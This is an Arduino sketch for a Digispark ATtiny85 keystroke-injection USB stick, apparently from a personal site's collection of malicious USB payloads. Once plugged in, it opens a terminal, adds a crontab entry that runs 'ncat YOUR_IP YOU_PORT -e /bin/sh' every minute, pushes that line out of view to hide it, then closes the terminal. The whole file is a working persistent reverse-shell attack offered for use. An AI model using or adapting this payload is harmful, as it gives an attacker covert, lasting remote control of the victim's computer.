//This DigiSpark scripts edits a reverse shell into the crontab that reaches out every minute to try and start a session with a local machine
//For use with the Digispark Attiny 85
//
//Author: Wesley Kent
//Created: 10/09/2022
//
//https://github.com/fe-moldark/wesleykent-website/blob/gh-pages/assets/malicious_usbs/reverse_shell_crontab.ino

#include "DigiKeyboard.h"
#define KEY_ARROW_DOWN  0x51 //only key that explicitly needs defined

void setup() {
}

void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T , MOD_CONTROL_LEFT | MOD_ALT_LEFT); //start the shell
  DigiKeyboard.delay(500);
  DigiKeyboard.print("crontab -e");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //punch down to the very bottom to try and hide the reverse shell
  for (int i=0;i<45;i++) {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  }
  DigiKeyboard.print("* * * * * ncat YOUR_IP YOU_PORT -e /bin/sh"); //this will need to be customized to your local IP and port
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_X , MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Q , MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); //close out the terminal
  DigiKeyboard.delay(500);
  for (;;) {
    /*empty*/
  }

}
